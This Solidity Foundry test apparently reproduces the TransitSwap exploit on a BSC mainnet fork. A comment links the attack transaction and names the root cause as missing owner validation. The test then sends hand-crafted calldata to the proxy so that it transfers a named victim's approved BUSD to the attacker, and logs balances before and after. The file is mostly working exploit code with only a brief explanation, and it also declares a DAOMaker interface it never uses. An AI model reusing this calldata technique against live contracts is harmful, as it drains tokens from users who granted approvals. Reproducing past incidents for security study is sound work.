// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;


import "forge-std/Test.sol";
import "./interface.sol";
/*

    Attack tx: https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189
    Attack eventlog: https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189#eventlog
    Debug transaction: https://phalcon.blocksec.com/tx/bsc/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189
    
    Attack steps: It's simple, but you need to study past transactions to know how to combine the call data.
    1.Incorrect owner address validation, you can input any innocent user who granted approvals to "0xed1afc8c4604958c2f38a3408fa63b32e737c428" before.
    in this case 0x1aae0303f795b6fcb185ea9526aa0549963319fc is a innocent user who has BUSD and granted approvals.
    
    2.
    Contract "0xed1afc8c4604958c2f38a3408fa63b32e737c428" will perform transferFrom to transfer amount of innocent user to attacker.
    That's it.

    Root cause: Incorrect owner address validation. 


*/

interface DAOMaker {
    function init(uint256 , uint256[] calldata, uint256[] calldata, address ) external;
    function emergencyExit(address) external;
}

contract ContractTest is Test {

    address TransitSwapPrxoy =  0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 21816545); // fork mainnet block number 21816545
    }

   function testExploit() public { 

    emit log_named_decimal_uint("Before exploiting, Attacker usdt balance",busd.balanceOf(address(this)), 18);

    TransitSwapPrxoy.call(hex"006de4df0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000a1137fe0cc191c11859c1d6fb81ae343d70cc17100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002707f79951b87b5400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000380000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000ed1afc8c4604958c2f38a3408fa63b32e737c4280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40a5ea46600000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e8400000000000000000000000000000000000000000000015638842fa55808c0af00000000000000000000000000000000000000000000000000000000000077c800000000000000000000000000000000000000000000000000000000");

    emit log_named_decimal_uint("After exploiting, Attacker BUSD balance",busd.balanceOf(address(this)), 18);
   }

   receive() external payable {}
}
